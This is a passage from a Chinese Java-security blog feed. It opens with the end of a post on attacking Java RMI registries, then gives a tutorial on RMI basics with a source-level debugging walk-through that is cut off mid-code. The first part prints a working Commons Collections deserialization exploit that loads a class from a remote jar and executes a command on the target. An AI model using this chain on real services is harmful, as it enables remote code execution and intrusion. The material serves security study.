class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br> <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br> <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br> <br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br> <br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="hljs-keyword">final</span> String name)<br>            <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br> <br>        <span class="hljs-keyword">return</span> ctor;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>; <span class="hljs-comment">//注册中心ip</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099</span>; <span class="hljs-comment">//注册中心端口</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">remotejar</span> <span class="hljs-operator">=</span> 远程jar;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ANN_INV_HANDLER_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(java.net.URLClassLoader.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getConstructor&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Class[].class &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; java.net.URL[].class &#125; &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newInstance&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object[].class &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[] &#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(remotejar) &#125;<br>                                    &#125;<br>                            &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;loadClass&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;ErrorBaseExec&quot;</span> &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;do_exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125; &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; command &#125; &#125;)<br>            &#125;;<br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br> <br>            <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>                    transformedChain);<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Class.forName(<br>                    <span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">ctor</span> <span class="hljs-operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);<br>            ctor.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> ctor.newInstance(Target.class, outerMap);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(ip, port);<br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)<br>                    .newInstance(Target.class,<br>                            outerMap);<br>            <span class="hljs-type">Remote</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(<br>                    Remote.class.getClassLoader(),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, h));<br>            registry.bind(<span class="hljs-string">&quot;liming&quot;</span>, r);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.print(e.getCause().getCause().getCause().getMessage());<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ee) &#123;<br>                <span class="hljs-keyword">throw</span> e;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#0x03-RMI-%E8%BF%9B%E9%98%B6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">Java反序列化之RMI专题02-RMI的几种攻击方式 | Drunkbaby’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-RMI基础(RMI通信原理)</title>
    <link href="/2025/09/24/Java%E5%AE%89%E5%85%A8-RMI%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/09/24/Java%E5%AE%89%E5%85%A8-RMI%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h1><p>RMI 全称 Remote Method Invocation（远程方法调用），即在一个 JVM 中 Java 程序调用在另一个远程 JVM 中运行的 Java 程序，这个远程 JVM 既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p><p>RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。</p><ul><li>这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范。</li></ul><blockquote><p>RMI 包括以下三个部分</p></blockquote><p><img src="https://docs.oracle.com/javase/tutorial/figures/rmi/rmi-2.gif" alt="RMI 系统使用现有的 Web 服务器，从服务到客户端以及从客户端到服务器进行通信"></p><ul><li><blockquote><p>Server ———— 服务端：服务端通过绑定远程对象，这个对象可以封装很多网络操作，也就是 Socket<br>Client ———— 客户端：客户端调用服务端的方法</p></blockquote><p>因为有了 C&#x2F;S 的交互，而且 Socket 是对应端口的，这个端口是动态的，所以这里引进了第三个 RMI 的部分 ———— Registry 部分。</p></li><li><p>Registry ———— 注册端；提供服务注册与服务获取。即 Server 端向 Registry 注册服务，比如地址、端口等一些信息，Client 端从 Registry 获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</p></li></ul><p>实际上在java中，动态二字是比较核心的，不管是类的动态加载还是动态代理，都是存在一个类似注册端的东西来执行分发请求获取服务等类似操作，有了这个注册端的存在，才让”动态”得以实现</p><h2 id="RMI实现demo"><a href="#RMI实现demo" class="headerlink" title="RMI实现demo"></a>RMI实现demo</h2><p>新建两个项目，Sever和Client</p><h2 id="RMISever"><a href="#RMISever" class="headerlink" title="RMISever"></a>RMISever</h2><p><strong>1.先编写一个远程接口，其中定义了一个 sayHello() 的方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;  <br>&#125;<br></code></pre></td></tr></table></figure><p>此远程接口要求作用域为 public；<br>继承 Remote 接口；<br>让其中的接口方法抛出异常</p><p><strong>2.定义实现接口的类(服务的具体实现内容)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteObj</span> &#123; <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>    <span class="hljs-comment">//    UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出  </span><br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();  <br> System.out.println(upKeywords);  <br> <span class="hljs-keyword">return</span> upKeywords;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>实现远程接口</li><li>继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）。 这个在后续的通信原理当中会讲到</li><li>构造函数需要抛出一个RemoteException错误</li><li>实现类中使用的对象必须都可序列化，即都继承<code>java.io.Serializable</code></li></ul><p><strong>3.注册远程对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;  <br>        <span class="hljs-comment">// 实例化远程对象  </span><br> <span class="hljs-type">RemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();  <br> <span class="hljs-comment">// 创建注册中心  </span><br> <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);  <br> <span class="hljs-comment">// 绑定对象示例到注册中心  </span><br> registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>port 默认是 1099，不写会自动补上，其他端口必须写</li><li>bind 的绑定这里，只要和客户端去查找的 registry 一致即可。</li></ul><h2 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h2><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>所以在客户端这里，也需要定义一个远程对象的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后编写客户端的代码，获取远程对象，并调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);  <br>        <span class="hljs-comment">//查找远程服务</span><br> <span class="hljs-type">RemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (RemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);  <br>        <span class="hljs-comment">//调用远程服务</span><br> remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这样就能够从远端的服务端中调用 RemoteHelloWorld 对象的 <code>sayHello()</code> 方法了。</p><p>运行后发现远程服务成功被调用</p><p>大写后的字符串成功在服务端输出</p><h1 id="IDEA调试-源码层面分析"><a href="#IDEA调试-源码层面分析" class="headerlink" title="IDEA调试(源码层面分析)"></a>IDEA调试(源码层面分析)</h1><p>工作原理</p><p><img src="/img/RMI/r01.png"></p><h2 id="创建部分"><a href="#创建部分" class="headerlink" title="创建部分"></a>创建部分</h2><h3 id="创建远程对象分析"><a href="#创建远程对象分析" class="headerlink" title="创建远程对象分析"></a>创建远程对象分析</h3><p>下一个断点进行调试</p><p><img src="/img/RMI/r02.png"></p><h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>开始调试，首先是到远程对象的构造函数 <code>RemoteObjImpl</code>，现在我们要把它发布到网络上去，我们要分析的是<strong>它如何被发布到网络上去的</strong></p><p><strong><code>RemoteObjImpl</code></strong> 这个类是继承于 <code>UnicastRemoteObject</code> 的，所以先会到父类的构造函数</p><p>这里如果想要走入父类的构造函数，需要我们手动在这里下一个断点，不然不会走进此函数</p><p>父类的构造函数这里的 port 传入了 0，它代表一个随机端口(因为这个端口是随机的，客户不知道会分配到什么，所以才需要注册端)</p><p><img src="/img/RMI/r03.png"></p><p><img src="/img/RMI/r04.png"></p><p>继续跟进，走入继承父类的一个核心的函数</p><p>有说法是如果实现remote接口时如果没有继承UnicastRemoteObject类，就需要加一条代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">UnicastRemoteObject.exportObject(<span class="hljs-built_in">this</span>, <span class="hljs-number">0</span>); <br><span class="hljs-comment">// 如果不能继承 UnicastRemoteObject 就需要手工导出</span><br></code></pre></td></tr></table></figure><p><img src="/img/RMI/r05.png"></p><p>这个静态函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> exportObject(obj, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(port));<br></code></pre></td></tr></table></figure><p>第一个参数是实现远程服务的，第二个参数是用来处理网络请求的</p><p>继续往下面跟，去到了 <code>UnicastServerRef</code> 的构造函数</p><p>跟进去之后 UnicastServerRef 的构造函数，我们看到它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看</p><p><img src="/img/RMI/r06.png"></p><p>继续跟进，来到它的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LiveRef</span><span class="hljs-params">(ObjID objID, <span class="hljs-type">int</span> port)</span> &#123;<br>        <span class="hljs-built_in">this</span>(objID, TCPEndpoint.getLocalEndpoint(port), <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>第一个参数是远程服务ID，跟进查看第二个参数控制什么</p><p>TCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求</p><p><img src="/img/RMI/r07.png"></p><p>继续刚才的调试</p><p>可以看到ip和端口被传入到LiveRef中</p><p><img src="/img/RMI/r08.png"></p><p>继续跟进，直接步过剩余步骤，来到之前出现 <code>LiveRef(port)</code> 的地方</p><p>回到这里，我们的LiveRef实例已经封装好了，看到它调用了父类的函数</p><p>进入到它调用的父类函数中查看，可以看到ref &#x3D; liveRef</p><p>整个<strong>创建远程服务</strong>的过程只会存在一个 LiveRef，这样记的话就不会乱</p><p><img src="/img/RMI/r09.png"></p><p>继续跟进到一个静态函数 <code>exportObject()</code>，后续的操作过程都与 <code>exportObject()</code> 有关，基本都是在调用它，这一段不是很重要，一路步入或者步过就好了。直到此处出现 Stub</p><p><img src="/img/RMI/r10.png"></p><p>翻译了一下这段英文注释，意思大概是这样的</p><p>把实现类对象导出 →生成客户端桩（stub）和服务端骨架（skeleton，旧版 RMI 才有） →把 stub 和实现类绑定起来 →注册到 RMI Registry，供客户端调用</p><p>实际上就是在服务端创建了一个客户端真正操作的代理，注册到 RMI Registry，供客户端调用</p><p>可以对照一下这张图</p><p><img src="/img/RMI/r01.png"></p><p>继续跟进，查看一下stub这个代理是如何创建的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">stub = Util.createProxy(implClass, getClientRef(), forceStubUse);<br></code></pre></td></tr></table></figure><p>我们直接跟进到createProxy这个函数里</p><p>先进行了基本的赋值</p><p><img src="/img/RMI/r11.png"></p><p>继续往下走入到一个判断中，这个先跳过了</p><p>继续跟进，看到类加载的语句</p><p><img src="/img/RMI/r12.png"></p><p>newProxyInstance之后就能创建好stub代理了</p><p>创建代理结束后来到Target</p><p>Target会把之前创建好的有用的所有东西封装起来，相当于一个总封装</p><p>跟进一下看看Target里到底有什么</p><p><img src="/img/RMI/r13.png"></p><p>这里可以看到服务端和客户端中都是传入的LiveRef，也就可以证明如果服务端和客户端要通信其实用的是同一个网络请求</p><p>实际上打开继续展开查看ref可以看到它的id与target中封装的id是一样的，所以LiveRef相当于是最核心的东西了</p><p>继续跟进，跳过一些有关Target的分装操作</p><p>来到此处，看到这行代码是把封装好的target发布成远程的object</p><p><img src="/img/RMI/r14.png"></p><p>我们跟进这个函数，看看具体是如何发布的</p><p>直接跟进到TCPTransport类的exportObject</p><p>看到第一句listen，开始处理网络请求，我们跟进这个函数</p><p><img src="/img/RMI/r15.png"></p><p>进来之后看到创建了一个服务端的socket，又开启了一个新线程，之后在 Thread 里面去做完成连接之后的事</p><p><img src="/img/RMI/r16.png"></p><p>Thread中具体做的就是处理网络请求的一系列操作</p><p>我们只需要知道处理网络请求是一个新的线程，与代码逻辑不在同一个线程中</p><p>需要注意的是，<code>newServerSocket()</code> 方法会给 port 进行赋值，核心语句如图</p><p>如果端口为0，则随机赋一个值</p><p><img src="/img/RMI/r17.png"></p><h4 id="记录发布结果"><a href="#记录发布结果" class="headerlink" title="记录发布结果"></a>记录发布结果</h4><p>跳过中间执行代码的部分(处理网络请求并发布)，来到ObjectTable的putTarget方法</p><p>一路跟进来到记录处</p><p><img src="/img/RMI/r18.png"></p><p>实际上objTable和implTable是两个Map类型的实例，RMI会把发布结果记录到这两个Map里</p><p><img src="/img/RMI/r19.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总结一个整个创建远程对象的流程，主要就是先发布远程对象，利用exportObject函数指定到发布的 IP 与端口，端口的话是一个随机值。至始至终复杂的地方其实都是在赋值，创建类，进行各种各样的封装，实际上并不复杂。</p><p>其中网络请求被封装在LiceRef对象里，客户端和服务端中封装在里面的都是这个对象</p><p>要特别注意的是，处理网络请求是一个单独的线程，与代码逻辑执行不在同一个线程中</p><p>最后发布了远程对象之后，会将相关对象和信息封装在两个Map中做一个记录</p><h3 id="创建注册中心-绑定"><a href="#创建注册中心-绑定" class="headerlink" title="创建注册中心+绑定"></a>创建注册中心+绑定</h3><p>这次在创建注册中心的位置下一个断点</p><p><img src="/img/RMI/r20.png"></p><h4 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h4><p>跟进一下发现进入了RegistryImpl这个对象里，if循环中是进行了一系列的安全检查</p><p><img src="/img/RMI/r21.png"></p><p>继续跟进可以看到再次创建了一个LiveRef对象，又创建了一个UnicastServerRef对象，这跟我们干刚看到的创建远程对象的步骤很像</p><p><img src="/img/RMI/r23.png"></p><p>跟进setup函数看一下</p><p>同样可以看到此处也调用了exportObject方法，但是这里的第三个参数，就是permanent的值是false，因为就代表着注册中心这个对象，是一个永久对象，而之前创建远程对象时，第三个参数是false，代表它是一个临时对象</p><p><img src="/img/RMI/r24.png"></p><p>继续跟进，要开始创建stub了</p><p><img src="/img/RMI/r25.png"></p><p>创建stub这里是跟之前创建远程对象那里有点不一样的</p><p>我们还是跟进 <code>createProxy()</code> 中，这里依旧要先做一个判断</p><p>判断是否存在文件名+_stub后缀的这个类</p><p><img src="/img/RMI/r26.png"></p><p><img src="/img/RMI/r27.png"></p><p>实际上，这个类是存在的</p><ul><li>对比<strong>发布远程对象</strong>那个步骤，创建注册中心是走进到 <code>createStub(remoteClass, clientRef);</code> 进去的，而<strong>发布远程对象</strong>则是直接创建动态代理的。</li></ul><p><img src="/img/RMI/r28.png"></p><p>进入到createStub方法，发现这个方法就是利用反射创建一个对象，将ref放进去</p><p>实际上创建远程对象和创建注册中心，新建stub的过程本质上是一样的，都是放了ref进去，只是一个用的是版本自带的stub，一个使用类加载新建了一个动态代理当作stub</p><p><img src="/img/RMI/r29.png"></p><p>反射加载stub成功之后我们继续跟进，发现又会走入一个条件判断</p><p>服务端定义好的，就调用 <code>setSkeleton()</code> 方法</p><p><img src="/img/RMI/r30.png"></p><p>跟进去。然后这里有一个 <code>createSkeleton()</code> 方法，一看名字就知道是用来创建 Skeleton 的，而 Skeleton 在我们的那幅图中，作为服务端的代理</p><p><img src="/img/RMI/r31.png"></p><p>Skeleton 是用 <code>forName()</code> 的方式创建的，其实与刚刚创建stub的过程类似，因为版本中也自带RegistryImpl_Skel类，不过多赘述了</p><p>创建成功后顺利返回，这里需要记住skel是UnicastServerRef的内部变量</p><p><img src="/img/RMI/r32.png"></p><p>再往后走，又到了 Target 的地方，Target 部分的作用也与之前一样，用于储存封装的数据</p><p>我们直接来到最后put的地方，看看Map中究竟放了哪些数据</p><p>打开static看到objTable中有三个Target，我们来分析一下</p><p><img src="/img/RMI/r33.png"></p><p>第一个是默认会创建的DGCImpl，先跳过</p><p>来看第二个</p><p>这个是我们创建的远程对象的stub(动态代理)，可以看到UnicastServerRef中的skel为空，并且已经设置好了随机端口</p><p>而且stub和disp中放的ref实际上是一样的</p><p><img src="/img/RMI/r34.png"></p><p>第三个是记录了创建注册中心的信息</p><p><img src="/img/RMI/r35.png"></p><h4 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h4><p>下断点在bind代码处</p><p><img src="/img/RMI/r36.png"></p><p>进入bind方法，先会进入一个检查，这个不是很重要</p><p><img src="/img/RMI/r37.png"></p><p>之后继续执行</p><p>会检查一下bindings(类似于HashMap)中是否有叫做remoteObj的东西，如果没有就会直接执行put进行绑定，就是把 IP 和端口放进去，到此处，绑定过程就结束了</p><h4 id="小结一下创建注册中心-绑定"><a href="#小结一下创建注册中心-绑定" class="headerlink" title="小结一下创建注册中心 + 绑定"></a>小结一下创建注册中心 + 绑定</h4><ul><li>总结一下比较简单，注册中心这里其实和发布远程对象很类似，不过多了一个持久的对象，这个持久的对象就成为了注册中心。</li></ul><p>绑定的话就更简单了，一句话形容一下就是 <code>hashTable.put(IP, port)</code></p><h2 id="客户端部分"><a href="#客户端部分" class="headerlink" title="客户端部分"></a>客户端部分</h2><h3 id="客户端请求注册中心-客户端"><a href="#客户端请求注册中心-客户端" class="headerlink" title="客户端请求注册中心-客户端"></a>客户端请求注册中心-客户端</h3><p>下一个断点，第一步会查找注册中心</p><p><img src="/img/RMI/r38.png"></p><p>进入之后发现这里是直接创建了一个LiveRef对象，将ip和port传进去然后封装起来</p><p><img src="/img/RMI/r39.png"></p><p>之后优惠走入createProxy方法，我们跟进看一下，发现它也是创建了一个stub。也就是说，当时在服务端创建的Registry_Stub并没有传过来，只是传过来了参数，这里客户端在本地又创建了一个stub</p><p><img src="/img/RMI/r40.png"></p><p>创建了这个stub之后，回到客户端代码执行下一句，进行lookup，传入name查找远程对象</p><p>现在对应的是流程图中Client传入name获取Stub的过程</p><p><img src="/img/RMI/r01.png"></p><p>这里我们直接进入RegistryImpl_Stub类来看一下lookup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 